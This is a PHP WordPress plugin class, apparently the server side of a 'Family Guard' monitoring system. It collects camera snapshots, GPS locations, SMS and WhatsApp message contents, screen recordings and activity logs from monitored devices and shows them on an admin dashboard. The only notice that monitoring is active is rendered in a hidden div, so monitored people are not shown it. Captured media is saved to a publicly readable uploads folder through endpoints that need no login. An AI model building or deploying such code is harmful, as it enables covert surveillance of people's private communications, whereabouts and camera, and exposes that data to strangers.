<?php
/**
 * Main Monitoring Plugin Class
 */

class FMP_Monitoring_Plugin {

    public function init() {
        // Register scripts and styles
        add_action('wp_enqueue_scripts', array($this, 'enqueue_frontend_assets'));
        add_action('admin_enqueue_scripts', array($this, 'enqueue_admin_assets'));
        
        // Shortcode for client tracker
        add_shortcode('monitoring-client', array($this, 'monitoring_client_shortcode'));
        
        // AJAX handlers
        add_action('wp_ajax_nopriv_fmp_send_camera', array($this, 'ajax_send_camera'));
        add_action('wp_ajax_fmp_send_camera', array($this, 'ajax_send_camera'));
        
        add_action('wp_ajax_nopriv_fmp_send_location', array($this, 'ajax_send_location'));
        add_action('wp_ajax_fmp_send_location', array($this, 'ajax_send_location'));
        
        add_action('wp_ajax_nopriv_fmp_send_messages', array($this, 'ajax_send_messages'));
        add_action('wp_ajax_fmp_send_messages', array($this, 'ajax_send_messages'));
        
        add_action('wp_ajax_nopriv_fmp_send_whatsapp', array($this, 'ajax_send_whatsapp'));
        add_action('wp_ajax_fmp_send_whatsapp', array($this, 'ajax_send_whatsapp'));
        
        add_action('wp_ajax_nopriv_fmp_send_screen', array($this, 'ajax_send_screen'));
        add_action('wp_ajax_fmp_send_screen', array($this, 'ajax_send_screen'));
        
        add_action('wp_ajax_nopriv_fmp_send_activity', array($this, 'ajax_send_activity'));
        add_action('wp_ajax_fmp_send_activity', array($this, 'ajax_send_activity'));
        
        add_action('wp_ajax_nopriv_fmp_check_consent', array($this, 'ajax_check_consent'));
        add_action('wp_ajax_fmp_check_consent', array($this, 'ajax_check_consent'));
        
        // Admin menu
        add_action('admin_menu', array($this, 'add_admin_menu'));
    }

    public function enqueue_frontend_assets() {
        wp_enqueue_style('fmp-frontend-style', FMP_PLUGIN_URL . 'assets/css/client.css', array(), FMP_PLUGIN_VERSION);
        wp_enqueue_script('fmp-frontend-script', FMP_PLUGIN_URL . 'assets/js/client-tracker.js', array('jquery'), FMP_PLUGIN_VERSION, true);
        
        wp_localize_script('fmp-frontend-script', 'fmpAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('fmp_nonce'),
            'deviceId' => $this->get_device_id()
        ));
    }

    public function enqueue_admin_assets() {
        wp_enqueue_style('fmp-admin-style', FMP_PLUGIN_URL . 'assets/css/admin-dashboard.css', array(), FMP_PLUGIN_VERSION);
        wp_enqueue_script('fmp-admin-script', FMP_PLUGIN_URL . 'assets/js/admin-dashboard.js', array('jquery'), FMP_PLUGIN_VERSION, true);
        wp_enqueue_script('chart-js', 'https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js', array(), '3.9.1', true);
    }

    public function add_admin_menu() {
        add_menu_page(
            'Family Guard Monitoring',
            'Family Guard',
            'manage_options',
            'fmp-dashboard',
            array($this, 'render_admin_dashboard'),
            'dashicons-visibility',
            25
        );

        add_submenu_page(
            'fmp-dashboard',
            'Dashboard',
            'Dashboard',
            'manage_options',
            'fmp-dashboard',
            array($this, 'render_admin_dashboard')
        );

        add_submenu_page(
            'fmp-dashboard',
            'Devices',
            'Devices',
            'manage_options',
            'fmp-devices',
            array($this, 'render_devices_page')
        );

        add_submenu_page(
            'fmp-dashboard',
            'Camera Feed',
            'Camera Feed',
            'manage_options',
            'fmp-camera',
            array($this, 'render_camera_page')
        );

        add_submenu_page(
            'fmp-dashboard',
            'Locations',
            'Locations',
            'manage_options',
            'fmp-locations',
            array($this, 'render_locations_page')
        );

        add_submenu_page(
            'fmp-dashboard',
            'Messages',
            'Messages',
            'manage_options',
            'fmp-messages',
            array($this, 'render_messages_page')
        );

        add_submenu_page(
            'fmp-dashboard',
            'WhatsApp',
            'WhatsApp',
            'manage_options',
            'fmp-whatsapp',
            array($this, 'render_whatsapp_page')
        );

        add_submenu_page(
            'fmp-dashboard',
            'Screen Recordings',
            'Screen Recordings',
            'manage_options',
            'fmp-screen',
            array($this, 'render_screen_page')
        );

        add_submenu_page(
            'fmp-dashboard',
            'Activity Logs',
            'Activity Logs',
            'manage_options',
            'fmp-logs',
            array($this, 'render_logs_page')
        );

        add_submenu_page(
            'fmp-dashboard',
            'Settings',
            'Settings',
            'manage_options',
            'fmp-settings',
            array($this, 'render_settings_page')
        );
    }

    public function render_admin_dashboard() {
        include FMP_PLUGIN_DIR . 'includes/admin/dashboard.php';
    }

    public function render_devices_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/devices.php';
    }

    public function render_camera_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/camera.php';
    }

    public function render_locations_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/locations.php';
    }

    public function render_messages_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/messages.php';
    }

    public function render_whatsapp_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/whatsapp.php';
    }

    public function render_screen_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/screen.php';
    }

    public function render_logs_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/logs.php';
    }

    public function render_settings_page() {
        include FMP_PLUGIN_DIR . 'includes/admin/settings.php';
    }

    // AJAX: Check Consent
    public function ajax_check_consent() {
        $device_id = isset($_POST['device_id']) ? sanitize_text_field($_POST['device_id']) : '';
        
        if (empty($device_id)) {
            wp_send_json_error('No device ID');
        }

        global $wpdb;
        $table = $wpdb->prefix . 'fmp_monitored_users';
        $user = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM $table WHERE device_id = %s",
            $device_id
        ));

        if ($user && $user->consent_given) {
            wp_send_json_success(array('consent' => true, 'user_id' => $user->user_id));
        } else {
            wp_send_json_error('Consent not given');
        }
    }

    // AJAX: Send Camera Image
    public function ajax_send_camera() {
        $device_id = isset($_POST['device_id']) ? sanitize_text_field($_POST['device_id']) : '';
        $image_data = isset($_POST['image']) ? sanitize_text_field($_POST['image']) : '';

        if (empty($device_id) || empty($image_data)) {
            wp_send_json_error('Missing data');
        }

        global $wpdb;
        $users_table = $wpdb->prefix . 'fmp_monitored_users';
        $user = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM $users_table WHERE device_id = %s AND consent_given = 1",
            $device_id
        ));

        if (!$user) {
            wp_send_json_error('Device not authorized');
        }

        $uploaded = $this->save_image($image_data, 'camera');
        
        if ($uploaded) {
            $camera_table = $wpdb->prefix . 'fmp_camera_captures';
            $wpdb->insert($camera_table, array(
                'device_id' => $device_id,
                'user_id' => $user->user_id,
                'image_url' => $uploaded['url'],
                'image_path' => $uploaded['path'],
            ));

            wp_send_json_success(array('message' => 'Camera image saved'));
        } else {
            wp_send_json_error('Failed to save image');
        }
    }

    // AJAX: Send Location
    public function ajax_send_location() {
        $device_id = isset($_POST['device_id']) ? sanitize_text_field($_POST['device_id']) : '';
        $latitude = isset($_POST['latitude']) ? floatval($_POST['latitude']) : 0;
        $longitude = isset($_POST['longitude']) ? floatval($_POST['longitude']) : 0;
        $accuracy = isset($_POST['accuracy']) ? floatval($_POST['accuracy']) : 0;
        $address = isset($_POST['address']) ? sanitize_text_field($_POST['address']) : '';

        if (empty($device_id)) {
            wp_send_json_error('Missing device ID');
        }

        global $wpdb;
        $users_table = $wpdb->prefix . 'fmp_monitored_users';
        $user = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM $users_table WHERE device_id = %s AND consent_given = 1",
            $device_id
        ));

        if (!$user) {
            wp_send_json_error('Device not authorized');
        }

        $location_table = $wpdb->prefix . 'fmp_locations';
        $wpdb->insert($location_table, array(
            'device_id' => $device_id,
            'user_id' => $user->user_id,
            'latitude' => $latitude,
            'longitude' => $longitude,
            'accuracy' => $accuracy,
            'address' => $address,
        ));

        wp_send_json_success(array('message' => 'Location saved'));
    }

    // AJAX: Send Messages
    public function ajax_send_messages() {
        $device_id = isset($_POST['device_id']) ? sanitize_text_field($_POST['device_id']) : '';
        $message_data = isset($_POST['messages']) ? $_POST['messages'] : array();

        if (empty($device_id)) {
            wp_send_json_error('Missing device ID');
        }

        global $wpdb;
        $users_table = $wpdb->prefix . 'fmp_monitored_users';
        $user = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM $users_table WHERE device_id = %s AND consent_given = 1",
            $device_id
        ));

        if (!$user) {
            wp_send_json_error('Device not authorized');
        }

        $messages_table = $wpdb->prefix . 'fmp_messages';
        
        if (is_array($message_data)) {
            foreach ($message_data as $msg) {
                $wpdb->insert($messages_table, array(
                    'device_id' => $device_id,
                    'user_id' => $user->user_id,
                    'message_content' => sanitize_textarea_field($msg['content']),
                    'sender' => sanitize_text_field($msg['sender']),
                    'recipient' => sanitize_text_field($msg['recipient']),
                    'message_type' => sanitize_text_field($msg['type']),
                ));
            }
        }

        wp_send_json_success(array('message' => 'Messages saved'));
    }

    // AJAX: Send WhatsApp Messages
    public function ajax_send_whatsapp() {
        $device_id = isset($_POST['device_id']) ? sanitize_text_field($_POST['device_id']) : '';
        $whatsapp_data = isset($_POST['whatsapp']) ? $_POST['whatsapp'] : array();

        if (empty($device_id)) {
            wp_send_json_error('Missing device ID');
        }

        global $wpdb;
        $users_table = $wpdb->prefix . 'fmp_monitored_users';
        $user = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM $users_table WHERE device_id = %s AND consent_given = 1",
            $device_id
        ));

        if (!$user) {
            wp_send_json_error('Device not authorized');
        }

        $whatsapp_table = $wpdb->prefix . 'fmp_whatsapp_messages';
        
        if (is_array($whatsapp_data)) {
            foreach ($whatsapp_data as $msg) {
                $wpdb->insert($whatsapp_table, array(
                    'device_id' => $device_id,
                    'user_id' => $user->user_id,
                    'whatsapp_number' => sanitize_text_field($msg['number']),
                    'message_content' => sanitize_textarea_field($msg['content']),
                    'sender' => sanitize_text_field($msg['sender']),
                    'recipient' => sanitize_text_field($msg['recipient']),
                ));
            }
        }

        wp_send_json_success(array('message' => 'WhatsApp messages saved'));
    }

    // AJAX: Send Screen Recording
    public function ajax_send_screen() {
        $device_id = isset($_POST['device_id']) ? sanitize_text_field($_POST['device_id']) : '';
        $video_data = isset($_POST['video']) ? sanitize_text_field($_POST['video']) : '';
        $duration = isset($_POST['duration']) ? intval($_POST['duration']) : 0;

        if (empty($device_id) || empty($video_data)) {
            wp_send_json_error('Missing data');
        }

        global $wpdb;
        $users_table = $wpdb->prefix . 'fmp_monitored_users';
        $user = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM $users_table WHERE device_id = %s AND consent_given = 1",
            $device_id
        ));

        if (!$user) {
            wp_send_json_error('Device not authorized');
        }

        $uploaded = $this->save_video($video_data, 'screen');
        
        if ($uploaded) {
            $recording_table = $wpdb->prefix . 'fmp_screen_recordings';
            $wpdb->insert($recording_table, array(
                'device_id' => $device_id,
                'user_id' => $user->user_id,
                'recording_url' => $uploaded['url'],
                'recording_path' => $uploaded['path'],
                'duration' => $duration,
                'file_size' => filesize($uploaded['path']),
            ));

            wp_send_json_success(array('message' => 'Screen recording saved'));
        } else {
            wp_send_json_error('Failed to save recording');
        }
    }

    // AJAX: Send Activity Log
    public function ajax_send_activity() {
        $device_id = isset($_POST['device_id']) ? sanitize_text_field($_POST['device_id']) : '';
        $activity_type = isset($_POST['type']) ? sanitize_text_field($_POST['type']) : '';
        $activity_desc = isset($_POST['description']) ? sanitize_textarea_field($_POST['description']) : '';

        if (empty($device_id)) {
            wp_send_json_error('Missing device ID');
        }

        global $wpdb;
        $users_table = $wpdb->prefix . 'fmp_monitored_users';
        $user = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM $users_table WHERE device_id = %s AND consent_given = 1",
            $device_id
        ));

        if (!$user) {
            wp_send_json_error('Device not authorized');
        }

        $logs_table = $wpdb->prefix . 'fmp_activity_logs';
        $wpdb->insert($logs_table, array(
            'device_id' => $device_id,
            'user_id' => $user->user_id,
            'activity_type' => $activity_type,
            'activity_description' => $activity_desc,
        ));

        wp_send_json_success(array('message' => 'Activity logged'));
    }

    // Shortcode: Monitoring Client
    public function monitoring_client_shortcode($atts) {
        ob_start();
        ?>
        <div id="fmp-client-container" style="display:none;">
            <p>Monitoring system is active. Your activity is being monitored for safety and security purposes.</p>
        </div>
        <script>
            var fmpDeviceId = '<?php echo $this->get_device_id(); ?>';
        </script>
        <?php
        return ob_get_clean();
    }

    // Helper: Get Device ID
    private function get_device_id() {
        if (isset($_COOKIE['fmp_device_id'])) {
            return sanitize_text_field($_COOKIE['fmp_device_id']);
        }
        
        $device_id = md5($_SERVER['HTTP_USER_AGENT'] . time());
        setcookie('fmp_device_id', $device_id, time() + (365 * 24 * 60 * 60), '/');
        return $device_id;
    }

    // Helper: Save Image
    private function save_image($image_data, $type) {
        $upload_dir = wp_upload_dir();
        $fmp_dir = $upload_dir['basedir'] . '/fmp-media/';
        
        if (!file_exists($fmp_dir)) {
            mkdir($fmp_dir, 0755, true);
        }

        $filename = $type . '-' . time() . '-' . uniqid() . '.jpg';
        $filepath = $fmp_dir . $filename;
        
        $image_data = str_replace('data:image/jpeg;base64,', '', $image_data);
        $image_data = str_replace('data:image/png;base64,', '', $image_data);
        $image_data = base64_decode($image_data);
        
        if (file_put_contents($filepath, $image_data)) {
            return array(
                'url' => $upload_dir['baseurl'] . '/fmp-media/' . $filename,
                'path' => $filepath
            );
        }
        
        return false;
    }

    // Helper: Save Video
    private function save_video($video_data, $type) {
        $upload_dir = wp_upload_dir();
        $fmp_dir = $upload_dir['basedir'] . '/fmp-media/';
        
        if (!file_exists($fmp_dir)) {
            mkdir($fmp_dir, 0755, true);
        }

        $filename = $type . '-' . time() . '-' . uniqid() . '.webm';
        $filepath = $fmp_dir . $filename;
        
        $video_data = str_replace('data:video/webm;base64,', '', $video_data);
        $video_data = base64_decode($video_data);
        
        if (file_put_contents($filepath, $video_data)) {
            return array(
                'url' => $upload_dir['baseurl'] . '/fmp-media/' . $filename,
                'path' => $filepath
            );
        }
        
        return false;
    }
}
